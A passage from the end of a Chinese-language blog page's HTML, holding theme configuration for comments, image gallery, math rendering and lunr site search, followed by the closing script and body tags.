art":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hstar.me","visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>